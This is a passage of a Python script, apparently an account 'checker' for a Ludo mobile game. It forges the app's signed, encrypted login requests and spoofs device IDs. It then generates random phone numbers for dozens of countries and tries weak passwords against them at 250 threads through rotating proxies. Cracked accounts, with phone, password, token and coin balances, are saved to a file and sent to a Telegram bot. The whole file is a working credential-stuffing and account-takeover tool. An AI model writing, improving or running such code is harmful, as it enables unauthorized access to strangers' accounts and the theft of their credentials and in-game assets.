        b0 = (b0 + b) & 0xffffffff
        c0 = (c0 + c) & 0xffffffff
        d0 = (d0 + d) & 0xffffffff
    return struct.pack('<4I', a0, b0, c0, d0)


def md5r(msg):
    return md5raw(msg.encode() if isinstance(msg, str) else msg, ivrev).hex()


def md5s(msg):
    if isinstance(msg, str):
        msg = msg.encode()
    return hashlib.md5(msg).hexdigest()


def md5upper(text):
    return hashlib.md5(text.encode('utf-8')).hexdigest().upper()


def encrypt_data(data, hera):
    k = md5r(hera + secret).encode()
    ks = (k * (len(data) // len(k) + 1))[:len(data)]
    return base64.b64encode(bytes(a ^ b for a, b in zip(data, ks))).decode()


def sign(data, hera):
    key = md5r(hera + secret).encode()
    return hmacmod.new(key, data, hashlib.sha256).hexdigest()


def medusa(data, hera):
    pt = f'{md5s(data)}-{len(data)}-{md5r(hera + secret)}-{secret}'
    ct = AES.new(b1key, AES.MODE_CBC, b1iv).encrypt(pad(pt.encode(), 16))
    return base64.b64encode(ct).decode()


def gendevice():
    device = str(uuid.uuid4())
    android = f'{uuid.uuid4().hex}_{uuid.uuid4().hex[:16]}'
    chars = string.ascii_letters + string.digits
    shumeng = ''.join(random.choice(chars) for _ in range(36))
    nonce = f'{random.randint(-2**31, 2**31 - 1)}_{uuid.uuid4()}'
    return device, android, shumeng, nonce


def baggage(timestamp, device, shumeng, nonce, android):
    obj = {
        "timeSpan": timestamp,
        "version": "1.5.1.0",
        "deviceId": device,
        "deviceName": "samsung Galaxy S23 Ultra",
        "deviceType": 2,
        "downloadChannelId": 1,
        "shuMengId": shumeng,
        "nonce": nonce,
        "plateType": 0,
        "LanguageId": 2,
        "phoneModel": "SM-S918B",
        "X-Phone-Country": "SA",
        "X-Sim-Country": "SA",
        "AndroidId": android,
        "appType": 0,
    }
    return base64.b64encode(json.dumps(obj, separators=(',',':')).encode()).decode()


def buildrequest(body, device, shumeng, nonce, android, token='', uid='0', path=None):
    now = str(int(time.time() * 1000))
    hera = uuid.uuid4().hex
    bag = baggage(now, device, shumeng, nonce, android)
    endpoint = path if path is not None else "/api/LudoAccountLoginRpcApiProxy/MobileAccountLogin"
    signed = (endpoint + token + ua + bag).encode('utf-8')
    xsign = f'{version}_2_{sign(signed, hera)}'
    xmedusa = medusa(signed, hera)
    encrypted_body = encrypt_data(body, hera)
    wire = json.dumps({"paramJsonString": encrypted_body}, separators=(',',':')).encode('utf-8')
    headers = {
        'User-Agent': ua,
        'UserId': str(uid),
        'X-App-Id': 'ludo',
        'X-Baggage': bag,
        'X-Access-Token': token,
        'X-Timestamp': now,
        'versionString': '1.5.1.0',
        'X-Sign': xsign,
        'X-Hera': hera,
        'X-Time': now,
        'X-Medusa': xmedusa,
        'Content-Type': 'application/json; charset=utf-8',
        'Accept-Encoding': 'gzip, deflate',
        'Connection': 'keep-alive',
    }
    return headers, wire


def xor_encrypt(data):
    return bytes(v ^ XOR_KEY[i % len(XOR_KEY)] for i, v in enumerate(data))


def xor_decrypt(data):
    return bytes(v ^ XOR_KEY[i % len(XOR_KEY)] for i, v in enumerate(data))


def get_md5(text):
    return hashlib.md5(text.encode('utf-8')).hexdigest().upper()


def clear_screen():
    os.system('clear' if os.name == 'posix' else 'cls')


def display_logo():
    clear_screen()
    print(Logo)
    print(f"{BOLD}{PINK}  ×─> {RED}════════════════════════════════════════════════════════════ <─×{RESET}")


def update_level_stats(level):
    if level < 10:
        levels_count[0] += 1
    elif level < 20:
        levels_count[1] += 1
    elif level < 30:
        levels_count[2] += 1
    elif level < 40:
        levels_count[3] += 1
    else:
        levels_count[4] += 1


def update_gold_stats(gold):
    if gold < 10000:
        golds_count[0] += 1
    elif gold < 50000:
        golds_count[1] += 1
    elif gold < 100000:
        golds_count[2] += 1
    elif gold < 500000:
        golds_count[3] += 1
    elif gold < 1000000:
        golds_count[4] += 1
    else:
        golds_count[5] += 1


def update_diamond_stats(diamond):
    if diamond < 10:
        diamonds_count[0] += 1
    elif diamond < 50:
        diamonds_count[1] += 1
    elif diamond < 100:
        diamonds_count[2] += 1
    elif diamond < 500:
        diamonds_count[3] += 1
    elif diamond < 1000:
        diamonds_count[4] += 1
    else:
        diamonds_count[5] += 1


def print_dashboard(stats, selected_country):
    clear_screen()
    elapsed = int(time.time() - start_time)
    total = stats.get('total', 0)
    good = stats.get('good', 0)
    wrong = stats.get('wrong_pass', 0)
    notreg = stats.get('not_registered', 0)
    error = stats.get('error', 0)

    wp, dp = _proxy_mgr.stats()
    proxy_status = f"{wp}W/{dp}D" if (wp + dp) > 0 else "No Proxies"

    dashboard = f"""
\033[36m┌──────────────────────────────────┐\033[0m
\033[36m│\033[0m     \033[1;37mCHECKER STATS v{version}\033[0m         \033[36m\033[0m
\033[36m├──────────────────────────────────┤\033[0m
\033[36m│\033[0m  \033[1;37mCountry\033[0m  : \033[1;33m{selected_country['name']}\033[0m                \033[36m\033[0m
\033[36m│\033[0m  \033[1;37mProxies\033[0m  : \033[1;33m{proxy_status}\033[0m                \033[36m\033[0m
\033[36m│\033[0m  \033[1;37mTime\033[0m     : \033[1;33m{elapsed}s\033[0m                \033[36m\033[0m
\033[36m│\033[0m  \033[1;37mChecked\033[0m  : \033[1;33m{total}\033[0m             \033[36m\033[0m
\033[36m├──────────────────────────────────┤\033[0m
\033[36m│\033[0m  \033[1;32mHits\033[0m     : \033[1;32m{good}\033[0m                    \033[36m\033[0m
\033[36m│\033[0m  \033[1;31mBads\033[0m     : \033[1;31m{wrong}\033[0m                     \033[36m\033[0m
\033[36m│\033[0m  \033[1;33mNotReg\033[0m   : \033[1;33m{notreg}\033[0m                  \033[36m\033[0m
\033[36m│\033[0m  \033[1;35mUnknown\033[0m  : \033[1;35m{error}\033[0m                   \033[36m\033[0m
\033[36m├──────────────────────────────────┤\033[0m
\033[36m│\033[0m  \033[1;36mLEVELS\033[0m                          \033[36m\033[0m
\033[36m│\033[0m  \033[1;36m├─\033[0m \033[1;37m0-9\033[0m       : \033[1;36m{levels_count[0]}\033[0m              \033[36m\033[0m
\033[36m│\033[0m  \033[1;36m├─\033[0m \033[1;37m10-19\033[0m     : \033[1;36m{levels_count[1]}\033[0m              \033[36m\033[0m
\033[36m│\033[0m  \033[1;36m├─\033[0m \033[1;37m20-29\033[0m     : \033[1;36m{levels_count[2]}\033[0m              \033[36m\033[0m
\033[36m│\033[0m  \033[1;36m├─\033[0m \033[1;37m30-39\033[0m     : \033[1;36m{levels_count[3]}\033[0m              \033[36m\033[0m
\033[36m│\033[0m  \033[1;36m└─\033[0m \033[1;37m40+\033[0m       : \033[1;36m{levels_count[4]}\033[0m              \033[36m\033[0m
\033[36m├──────────────────────────────────┤\033[0m
\033[36m│\033[0m  \033[1;33mGOLD\033[0m                            \033[36m\033[0m
\033[36m│\033[0m  \033[1;33m├─\033[0m \033[1;37m0-10k\033[0m     : \033[1;33m{golds_count[0]}\033[0m              \033[36m\033[0m
\033[36m│\033[0m  \033[1;33m├─\033[0m \033[1;37m10k-50k\033[0m   : \033[1;33m{golds_count[1]}\033[0m              \033[36m\033[0m
\033[36m│\033[0m  \033[1;33m├─\033[0m \033[1;37m50k-100k\033[0m  : \033[1;33m{golds_count[2]}\033[0m              \033[36m\033[0m
\033[36m│\033[0m  \033[1;33m├─\033[0m \033[1;37m100k-500k\033[0m : \033[1;33m{golds_count[3]}\033[0m              \033[36m\033[0m
\033[36m│\033[0m  \033[1;33m├─\033[0m \033[1;37m500k-1M\033[0m   : \033[1;33m{golds_count[4]}\033[0m              \033[36m\033[0m
\033[36m│\033[0m  \033[1;33m└─\033[0m \033[1;37m1M+\033[0m       : \033[1;33m{golds_count[5]}\033[0m              \033[36m\033[0m
\033[36m├──────────────────────────────────┤\033[0m
\033[36m│\033[0m  \033[1;34mDIAMOND\033[0m                         \033[36m\033[0m
\033[36m│\033[0m  \033[1;34m├─\033[0m \033[1;37m0-10\033[0m      : \033[1;34m{diamonds_count[0]}\033[0m              \033[36m\033[0m
\033[36m│\033[0m  \033[1;34m├─\033[0m \033[1;37m10-50\033[0m     : \033[1;34m{diamonds_count[1]}\033[0m              \033[36m\033[0m
\033[36m│\033[0m  \033[1;34m├─\033[0m \033[1;37m50-100\033[0m    : \033[1;34m{diamonds_count[2]}\033[0m              \033[36m\033[0m
\033[36m│\033[0m  \033[1;34m├─\033[0m \033[1;37m100-500\033[0m   : \033[1;34m{diamonds_count[3]}\033[0m              \033[36m\033[0m
\033[36m│\033[0m  \033[1;34m├─\033[0m \033[1;37m500-1K\033[0m    : \033[1;34m{diamonds_count[4]}\033[0m              \033[36m\033[0m
\033[36m│\033[0m  \033[1;34m└─\033[0m \033[1;37m1K+\033[0m       : \033[1;34m{diamonds_count[5]}\033[0m              \033[36m\033[0m
\033[36m├──────────────────────────────────┤\033[0m
\033[36m│\033[0m  \033[1;35m@Mikel1d ~ t.me/Mikel224\033[0m         \033[36m\033[0m
\033[36m└──────────────────────────────────┘\033[0m
"""
    print(dashboard)
    if hits_list:
        print(f"\n{BOLD}{GREEN}═══ {PINK}HIT ACCOUNTS {GREEN}═══{RESET}")
        for hit in hits_list[-5:]:
            print(f"{BOLD}{GREEN}[{PINK}HIT{GREEN}]{RESET} {BOLD}{PINK}ID: {YELLOW}{hit.get('id', 'N/A')}{RESET} {BOLD}{BLUE}|{RESET} {BOLD}{GREEN}Name: {hit.get('name', 'N/A')}{RESET}")
        print()
    sys.stdout.flush()


def decode_response(resp_data, hera=None):
    if "paramJsonString" not in resp_data:
        return resp_data
    param = resp_data["paramJsonString"]
    if not isinstance(param, str):
        return resp_data
    try:
        raw = base64.b64decode(param)
    except Exception:
        return resp_data
    try:
        return json.loads(xor_decrypt(raw).decode('utf-8'))
    except Exception:
        pass
    if hera:
        try:
            k = md5r(hera + secret).encode()
            ks = (k * (len(raw) // len(k) + 1))[:len(raw)]
            dec = bytes(a ^ b for a, b in zip(raw, ks))
            return json.loads(dec.decode('utf-8'))
        except Exception:
            pass
    return resp_data


def get_account_info(token, uid, account_id, device, android, shumeng, nonce):
    info_payload = {
        "accountId": int(account_id),
        "simCountry": "SA",
        "version": "1.5.1.0",
        "deviceId": device,
        "deviceName": "samsung Galaxy S23 Ultra",
        "deviceType": 2,
        "downloadChannelId": 1,
        "shuMengId": shumeng,
        "nonce": nonce,
        "plateType": 0,
        "languageId": 2,
        "phoneModel": "SM-S918B",
        "X-Phone-Country": "SA",
        "X-Sim-Country": "SA",
        "AndroidId": android,
        "IsSubpackages": 0,
        "appType": 0,
    }
    body = json.dumps(info_payload, separators=(',',':'), ensure_ascii=False).encode('utf-8')

    for host in INFO_HOSTS:
        domain_key = host
        if not _domain_cb.allow(domain_key):
            continue
        proxy_rec = get_next_proxy_data()
        proxies = proxy_rec['proxy'] if proxy_rec else None
        try:
            headers, wire = buildrequest(body, device, shumeng, nonce, android, token=token, uid=str(uid), path=INFO_PATH)
            headers['accessId'] = md5upper(str(account_id))
            resp = get_session().post(
                host + INFO_PATH,
                data=wire, headers=headers,
                timeout=(_net_cfg.CONNECT_TIMEOUT, 6),
                proxies=proxies
            )
            if resp.status_code == 200:
                decoded = decode_response(resp.json(), headers.get('X-Hera', ''))
                if decoded.get('status') == 0:
                    mark_proxy_success(proxy_rec)
                    _domain_cb.success(domain_key)
                    return decoded.get('data', {})
        except (requests.exceptions.ProxyError,
                requests.exceptions.ConnectTimeout,
                requests.exceptions.ReadTimeout,
                requests.exceptions.ConnectionError):
            if proxy_rec:
                mark_proxy_failed(proxy_rec)
            _domain_cb.failure(domain_key)
            continue
        except Exception:
            continue
    return None


def telegram_sender_worker():
    global stats
    while not stop_flag:
        try:
            message_data = telegram_queue.get(timeout=1)
            if message_data is None:
                telegram_queue.task_done()
                break
            phone, pwd, account_info, login_data = message_data
            show_num_id = login_data.get("showNumId", "N/A")
            name = login_data.get("name", "N/A") if login_data else "N/A"
            base_info = account_info.get('baseInfo', {}) if account_info else {}
            vip = 'Yes' if base_info.get('isVip') else 'No'
            gold = base_info.get('goldNum', 'N/A')
            diamond = base_info.get('diamondNum', 'N/A')
            level = base_info.get('levelId', 'N/A')

            text = f"""
              ✦  Ludo HTS ✅ ✦              
═══════ ❖ ═════════════════
❖ المعرف    ➜ {show_num_id}
❖ الاسم     ➜ {name}
❖ الجوال    ➜ {phone}
❖ كلمة السر ➜ {pwd}
ــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــ
❖ VIP  ⭐     ➜ {vip}
❖ الذهب  💛   ➜ {gold}
❖ الألماس  💎 ➜ {diamond}
❖ المستوى ⚡  ➜ {level}
═══════ ❖ ════════════
❖ القناة    ➜ https://t.me/Mikel224
❖ المطور    ➜ @Mikel1d
═══════ ❖ ══════════"""

            max_retries = 3
            for attempt in range(max_retries):
                try:
                    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
                    proxy_rec = get_next_proxy_data()
                    proxies = proxy_rec['proxy'] if proxy_rec else None
                    r = get_session().post(url, json={
                        "chat_id": CHAT_ID,
                        "text": text,
                        "parse_mode": "Markdown"
                    }, timeout=(5, 12), proxies=proxies)
                    if r.status_code == 200:
                        with lock:
                            stats['sent_tel'] += 1
                        mark_proxy_success(proxy_rec)
                        break
                    elif r.status_code == 429:
                        time.sleep(2 ** attempt)
                    else:
                        if proxy_rec:
                            mark_proxy_failed(proxy_rec)
                        if attempt == max_retries - 1:
                            r = get_session().post(url, json={"chat_id": CHAT_ID, "text": text},
                                                  timeout=(5, 12), proxies=proxies)
                            if r.status_code == 200:
                                with lock:
                                    stats['sent_tel'] += 1
                            else:
                                with lock:
                                    stats['failed_tel'] += 1
                        else:
                            time.sleep(1)
                except Exception:
                    if attempt == max_retries - 1:
                        with lock:
                            stats['failed_tel'] += 1
                    else:
                        time.sleep(1)
            telegram_queue.task_done()
        except queue.Empty:
            continue
        except Exception:
            with lock:
                stats['failed_tel'] += 1
            try:
                telegram_queue.task_done()
            except Exception:
                pass


def queue_telegram_message(phone, pwd, account_info, login_data):
    if not BOT_TOKEN or not CHAT_ID:
        return
    telegram_queue.put((phone, pwd, account_info, login_data))


def save_valid_account(phone, pwd, account_info, login_data):
    try:
        show_num_id = login_data.get("showNumId", "N/A")
        name = login_data.get("name", "N/A")
        base_info = account_info.get('baseInfo', {}) if account_info else {}
        vip = 'Yes' if base_info.get('isVip') else 'No'
        gold = base_info.get('goldNum', 'N/A')
        diamond = base_info.get('diamondNum', 'N/A')
        level = base_info.get('levelId', 'N/A')
        balance = base_info.get('balance', 'N/A')
        token = login_data.get("token", "N/A")
        uid = login_data.get("id", "N/A")
        with open(valid_accounts_file, "a", encoding="utf-8") as f:
            f.write(f"Phone: {phone}\nPass: {pwd}\n")
            f.write(f"ID: {show_num_id}\nName: {name}\nUID: {uid}\n")
            f.write(f"VIP: {vip}\nGold: {gold}\nDiamond: {diamond}\n")
            f.write(f"Level: {level}\nBalance: {balance}\n")
            f.write(f"Token: {token}\n")
            f.write("=" * 50 + "\n")
    except Exception:
        pass


def check_number(mobile, country_data):
    global results, stats
    if stop_flag:
        return

    payload_base = PAYLOAD.copy()
    payload_base["mobile"] = mobile.lstrip("0")
    payload_base["areaCode"] = country_data["code"]
    payload_base["simCountry"] = country_data["countryCode"]
    payload_base["X-Phone-Country"] = country_data["countryCode"]
    payload_base["X-Sim-Country"] = country_data["countryCode"]
    payload_base["hostConfig"] = [
        {**cfg, "countryCode": country_data["countryCode"] if cfg.get("countryCode") != "" else ""}
        for cfg in PAYLOAD["hostConfig"]
    ]

    mobile_clean = mobile.lstrip("0")
    test_passwords = []
    for candidate in (mobile_clean, mobile_clean + mobile_clean):
        if candidate not in test_passwords:
            test_passwords.append(candidate)
    for pwd in PASSWORDS:
        if pwd not in test_passwords:
            test_passwords.append(pwd)

    for pwd in test_passwords:
        if stop_flag:
            return

        device, android, shumeng, nonce = gendevice()
        payload_dict = payload_base.copy()
        payload_dict["deviceId"] = device
        payload_dict["AndroidId"] = android
        payload_dict["shuMengId"] = shumeng
        payload_dict["nonce"] = nonce
        payload_dict["password"] = get_md5(pwd)

        data = None

        for domain in DOMAINS:
            if not _domain_cb.allow(domain):
                continue
            proxy_rec = get_next_proxy_data()
            proxies = proxy_rec['proxy'] if proxy_rec else None
            try:
                body = json.dumps(payload_dict, separators=(',',':'), ensure_ascii=False).encode('utf-8')
                headers, wire = buildrequest(body, device, shumeng, nonce, android)
                resp = get_session().post(
                    BASE_URL.format(domain=domain),
                    data=wire, headers=headers,
                    timeout=(_net_cfg.CONNECT_TIMEOUT, _net_cfg.READ_TIMEOUT),
                    proxies=proxies
                )
                if resp.status_code != 200:
                    if proxy_rec:
                        mark_proxy_failed(proxy_rec)
                    _domain_cb.failure(domain)
                    continue
                mark_proxy_success(proxy_rec)
                _domain_cb.success(domain)
                data = decode_response(resp.json(), headers.get('X-Hera', ''))
                break
            except (requests.exceptions.ProxyError,
                    requests.exceptions.ConnectTimeout,
                    requests.exceptions.ReadTimeout,
                    requests.exceptions.ConnectionError):
                if proxy_rec:
                    mark_proxy_failed(proxy_rec)
                _domain_cb.failure(domain)
                continue
            except Exception:
                _domain_cb.failure(domain)
                continue

        if data is None:
            with lock:
                stats['error'] += 1
                stats['total'] += 1
            continue

        status = data.get("status", -1)

        if status == 0:
            acct = data.get("data", {})
            token = acct.get("token", "")
            user_id = acct.get("id", "")
            account_info = None
            if token and user_id:
                account_info = get_account_info(token, user_id, user_id, device, android, shumeng, nonce)

            with lock:
                results.append("good")
                stats['good'] += 1
                stats['total'] += 1
                base_info = account_info.get('baseInfo', {}) if account_info else {}
                level = base_info.get('levelId', 0)
                gold = base_info.get('goldNum', 0)
                diamond = base_info.get('diamondNum', 0)
                try:
                    update_level_stats(int(level))
                except Exception:
                    update_level_stats(0)
                try:
                    update_gold_stats(int(gold))
                except Exception:
                    update_gold_stats(0)
                try:
                    update_diamond_stats(int(diamond))
                except Exception:
                    update_diamond_stats(0)
                hits_list.append({
                    'phone': mobile, 'pass': pwd,
                    'id': acct.get('showNumId', 'N/A'),
                    'name': acct.get('name', 'N/A'),
                    'gold': gold, 'diamond': diamond, 'level': level,
                    'vip': 'Yes' if base_info.get('isVip') else 'No'
                })

            queue_telegram_message(mobile, pwd, account_info, acct)
            save_valid_account(mobile, pwd, account_info, acct)
            return

        elif status == 151:
            continue
        elif status == 182 or status == 1001:
            with lock:
                results.append("notreg")
                stats['not_registered'] += 1
                stats['total'] += 1
            return
        else:
            with lock:
                stats['wrong_pass'] += 1
                stats['total'] += 1
            return

    with lock:
        results.append("wrong")
        stats['wrong_pass'] += 1
        stats['total'] += 1


def generate_mobile(country_data):
    cc = country_data["countryCode"]
    p = country_data["prefixes"]

    def rand_n(n):
        return ''.join(str(random.randint(0, 9)) for _ in range(n))

    if cc == "IN":  return random.choice(p) + rand_n(9)
    if cc == "PK":  return random.choice(p) + rand_n(7)
    if cc == "BD":  return random.choice(p) + rand_n(8)
    if cc == "ID":  return random.choice(p) + rand_n(8)
    if cc == "NP":  return random.choice(p) + rand_n(8)
    if cc == "LK":  return random.choice(p) + rand_n(7)
    if cc == "IQ":  return random.choice(["077", "078"]) + rand_n(8)
    if cc == "SA":  return random.choice(p) + rand_n(7)
    if cc == "EG":  return random.choice(p) + rand_n(8)
    if cc == "AE":  return random.choice(p)[1:] + rand_n(7)
    if cc == "JO":  return random.choice(p) + rand_n(7)
    if cc == "LB":  return random.choice(p) + rand_n(6)
    if cc == "SY":  return random.choice(p) + rand_n(7)
    if cc == "PS":  return random.choice(p) + rand_n(7)
    if cc == "KW":  return random.choice(p) + rand_n(5)
    if cc == "QA":  return random.choice(p) + rand_n(5)
    if cc == "BH":  return random.choice(p) + rand_n(5)
    if cc == "OM":  return random.choice(p) + rand_n(5)
    if cc == "YE":  return random.choice(p) + rand_n(6)
    if cc == "MA":  return random.choice(p) + rand_n(7)
    if cc == "DZ":  return random.choice(p) + rand_n(7)
    if cc == "TN":  return random.choice(p) + rand_n(5)
    if cc == "LY":  return random.choice(p) + rand_n(7)
    if cc == "SD":  return random.choice(p) + rand_n(7)
    if cc == "SO":  return random.choice(p) + rand_n(7)
    if cc == "DJ":  return random.choice(p) + rand_n(5)
    if cc == "MR":  return random.choice(p) + rand_n(5)
    if cc == "KM":  return random.choice(p) + rand_n(4)
    prefix = random.choice(p)
    remaining = 10 - len(prefix)
    return prefix + (rand_n(remaining) if remaining > 0 else '')


def show_countries():
    print(f"\n{BOLD}{PINK}═══ {RED}Available Countries {PINK}═══{RESET}\n")
    for key, country in countries_data.items():
        codes_str = " | ".join(country["prefixes"][:3]) + "..."
        print(f"{BOLD}{GREEN}[{YELLOW}{key}{GREEN}]{RESET} {BOLD}{CYAN}{country['name']}{RESET} {BOLD}{PINK}➜ {RED}+{country['code']} {BLUE}{codes_str}{RESET}")
    print()


def get_country_choice():
    show_countries()
    while True:
        choice = input(f"{BOLD}{RED}[?]{RESET} {BOLD}{PINK}Select country ({GREEN}1{RESET}{BOLD}{PINK}-{GREEN}{len(countries_data)}{RESET}{BOLD}{PINK}):{RESET} ").strip()
        if choice in countries_data:
            return countries_data[choice]
        print(f"{BOLD}{RED}Invalid choice!{RESET}")


def get_password_mode(selected_country):
    if selected_country["countryCode"] == "IQ":
        return IRAQ_PASSWORDS.copy()
    print(f"\n{BOLD}{PINK}═══ {RED}Password Mode {PINK}═══{RESET}\n")
    print(f"{BOLD}{GREEN}[{YELLOW}1{GREEN}]{RESET} {BOLD}{CYAN}Use Default Passwords{RESET}")
    print(f"{BOLD}{GREEN}[{YELLOW}2{GREEN}]{RESET} {BOLD}{CYAN}Add Custom Passwords{RESET}")
    while True:
        choice = input(f"\n{BOLD}{RED}[?]{RESET} {BOLD}{PINK}Select mode ({GREEN}1{RESET}{BOLD}{PINK}-{GREEN}2{RESET}{BOLD}{PINK}):{RESET} ").strip()
        if choice == "1":
            return DEFAULT_PASSWORDS.copy()
        elif choice == "2":
            return add_custom_passwords()
        print(f"{BOLD}{RED}Invalid choice!{RESET}")


def add_custom_passwords():
    passwords = []
    print(f"\n{BOLD}{PINK}═══ {RED}Add Custom Passwords {PINK}═══{RESET}\n")
    while True:
        try:
            count = int(input(f"{BOLD}{RED}[?]{RESET} {BOLD}{PINK}How many passwords do you want to add?{RESET} ").strip())
            if count > 0:
                break
            print(f"{BOLD}{RED}Please enter a positive number!{RESET}")
        except ValueError:
            print(f"{BOLD}{RED}Please enter a valid number!{RESET}")
    print(f"\n{BOLD}{CYAN}Enter {YELLOW}{count}{RESET} {BOLD}{CYAN}passwords one by one:{RESET}\n")
    for i in range(1, count + 1):
        pwd = input(f"{BOLD}{GREEN}[{YELLOW}{i}{GREEN}]{RESET} {BOLD}{PINK}Password:{RESET} ").strip()
        if pwd:
            passwords.append(pwd)
    if passwords:
        print(f"\n{BOLD}{GREEN}[+] {PINK}Added {YELLOW}{len(passwords)}{RESET} {BOLD}{PINK}passwords!{RESET}")
    else:
        print(f"\n{BOLD}{RED}[!] {PINK}No passwords added, using default passwords!{RESET}")
        passwords = DEFAULT_PASSWORDS.copy()
    return passwords


def dashboard_loop(selected_country):
    while not stop_flag:
        print_dashboard(stats, selected_country)
        time.sleep(0.1)


def main():
    global stop_flag, PASSWORDS, start_time, proxy_list, working_proxies, BOT_TOKEN, CHAT_ID

    display_logo()

    print(f"\n{BOLD}{PINK}[{RED}Proxy Settings{PINK}]{RESET}")
    proxy_path = input(f"{BOLD}{RED}[?]{RESET} {BOLD}{PINK}Enter proxy file path: {RESET}").strip()

    if proxy_path:
        if load_proxies_from_file(proxy_path):
            print(f"\n{BOLD}{PINK}[{RED}Checking Proxies{PINK}]{RESET}")
            has_working = check_all_proxies()
            if not has_working:
                print(f"{BOLD}{YELLOW}[!] {PINK}Continuing without proxies...{RESET}")
                working_proxies = []
                proxy_list = []
        else:
            print(f"{BOLD}{RED}[!] {PINK}Failed to load proxies, continuing without...{RESET}")
            working_proxies = []
            proxy_list = []
    else:
        print(f"{BOLD}{YELLOW}[!] {PINK}No proxy file specified, continuing without proxies...{RESET}")
        working_proxies = []
        proxy_list = []

    print(f"\n{BOLD}{PINK}[{RED}Bot Settings{PINK}]{RESET}")
    BOT_TOKEN = input(f"{BOLD}{RED}[?]{RESET} {BOLD}{PINK}Bot Token:{RESET} ").strip()
    CHAT_ID = input(f"{BOLD}{RED}[?]{RESET} {BOLD}{PINK}Chat ID:{RESET} ").strip()

    print(f"\n{BOLD}{PINK}[{RED}Country Settings{PINK}]{RESET}")
    selected_country = get_country_choice()
    print(f"{BOLD}{GREEN}[+] {PINK}Selected: {CYAN}{selected_country['name']} {PINK}({RED}+{selected_country['code']}{PINK}){RESET}")

    PASSWORDS = get_password_mode(selected_country)

    print(f"\n{BOLD}{PINK}═══ {RED}Configuration Summary {PINK}═══{RESET}")
    print(f"{BOLD}{PINK}Bot Token: {BLUE}{BOT_TOKEN[:20]}...{RESET}" if BOT_TOKEN else f"{BOLD}{RED}No Bot Token{RESET}")
    print(f"{BOLD}{PINK}Chat ID: {BLUE}{CHAT_ID}{RESET}")
    print(f"{BOLD}{PINK}Proxies: {BLUE}{len(working_proxies)} working / {len(proxy_list)} total{RESET}")
    print(f"{BOLD}{PINK}Valid accounts will be saved to: {BLUE}{valid_accounts_file}{RESET}")
    print(f"{BOLD}{PINK}Passwords to test: {BLUE}{len(PASSWORDS)}{RESET}")
    print(f"{BOLD}{GREEN}[+] {PINK}Will test: {CYAN}number itself, number twice, then {YELLOW}{len(PASSWORDS)}{RESET} {BOLD}{PINK}custom passwords{RESET}")

    THREADS = 250
    start_time = time.time()

    for _ in range(3):
        threading.Thread(target=telegram_sender_worker, daemon=True).start()

    threading.Thread(target=dashboard_loop, args=(selected_country,), daemon=True).start()

    with ThreadPoolExecutor(max_workers=THREADS) as executor:
        while not stop_flag:
            mobile = generate_mobile(selected_country)
            executor.submit(check_number, mobile, selected_country)
            time.sleep(0.001)


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n{BOLD}{RED}[!] {PINK}Interrupted by user{RESET}")
        stop_flag = True
        sys.exit(0)